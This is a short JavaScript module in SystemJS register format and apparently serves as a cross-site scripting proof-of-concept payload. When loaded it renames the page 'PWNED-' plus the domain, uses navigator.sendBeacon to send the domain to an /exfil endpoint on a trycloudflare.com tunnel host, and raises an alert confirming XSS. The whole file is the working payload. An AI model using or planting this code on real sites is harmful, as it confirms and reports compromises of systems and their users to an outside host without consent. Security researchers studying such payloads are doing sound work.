System.register([], function(exports) {
  return {
    execute: function() {
      document.title = "PWNED-" + document.domain;
      navigator.sendBeacon("https://null-taxation-statements-silence.trycloudflare.com/exfil?domain=" + document.domain + "&proof=xss_confirmed");
      alert("XSS on " + document.domain);
    }
  };
});
